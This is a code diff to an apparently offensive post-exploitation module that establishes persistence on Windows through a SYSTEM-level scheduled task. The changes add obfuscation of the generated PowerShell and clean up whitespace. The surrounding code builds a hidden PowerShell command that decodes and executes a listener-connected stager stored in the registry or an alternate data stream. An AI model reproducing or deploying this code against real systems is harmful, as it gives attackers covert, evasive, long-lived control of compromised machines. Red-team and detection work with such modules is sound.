@@ -15,13 +15,13 @@ class Module:
             'Background' : False,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : True,
 
             'OpsecSafe' : False,
 
             'MinPSVersion' : '2',
-            
+
             'Comments': [
                 'https://github.com/mattifestation/PowerSploit/blob/master/Persistence/Persistence.psm1'
             ]
@@ -70,7 +70,7 @@ class Module:
                 'Description'   :   'Alternate-data-stream location to store the script code.',
                 'Required'      :   False,
                 'Value'         :   ''
-            },                       
+            },
             'ExtFile' : {
                 'Description'   :   'Use an external file for the payload instead of a stager.',
                 'Required'      :   False,
@@ -109,16 +109,16 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
-        
+    def generate(self, obfuscate=False, obfuscationCommand=""):
+
         listenerName = self.options['Listener']['Value']
-        
+
         # trigger options
         dailyTime = self.options['DailyTime']['Value']
         idleTime = self.options['IdleTime']['Value']
         onLogon = self.options['OnLogon']['Value']
         taskName = self.options['TaskName']['Value']
-    
+
         # storage options
         regPath = self.options['RegPath']['Value']
         adsPath = self.options['ADSPath']['Value']
@@ -158,11 +158,12 @@ class Module:
 
             script += "schtasks /Delete /F /TN "+taskName+";"
             script += "'Schtasks persistence removed.'"
-
+            if obfuscate:
+                script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
             return script
 
         if extFile != '':
-            # read in an external file as the payload and build a 
+            # read in an external file as the payload and build a
             #   base64 encoded version as encScript
             if os.path.exists(extFile):
                 f = open(extFile, 'r')
@@ -187,7 +188,7 @@ class Module:
             else:
                 # generate the PowerShell one-liner with all of the proper options set
                 launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
-                
+
                 encScript = launcher.split(" ")[-1]
                 statusMsg += "using listener " + listenerName
 
@@ -197,7 +198,7 @@ class Module:
             if ".txt" not in adsPath:
                     print helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt")
                     return ""
-            
+
             script = "Invoke-Command -ScriptBlock {cmd /C \"echo "+encScript+" > "+adsPath+"\"};"
 
             locationString = "$(cmd /c \''\''more < "+adsPath+"\''\''\'')"
@@ -219,7 +220,7 @@ class Module:
 
         # built the command that will be triggered by the schtask
         triggerCmd = "'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String("+locationString+")))\\\"'"
-        
+
         # sanity check to make sure we haven't exceeded the cmd.exe command length max
         if len(triggerCmd) > 259:
             print helpers.color("[!] Warning: trigger command exceeds the maximum of 259 characters.")
@@ -233,9 +234,13 @@ class Module:
             statusMsg += " with "+taskName+" idle trigger on " + idleTime + "."
         else:
             # otherwise assume we're doing a daily trigger
-	    
+
             script += "schtasks /Create /F /RU system /SC DAILY /ST "+dailyTime+" /TN "+taskName+" /TR "+triggerCmd+";"
             statusMsg += " with "+taskName+" daily trigger at " + dailyTime + "."
         script += "'Schtasks persistence established "+statusMsg+"'"
-
+        if obfuscate:
+            script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
         return script
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        return
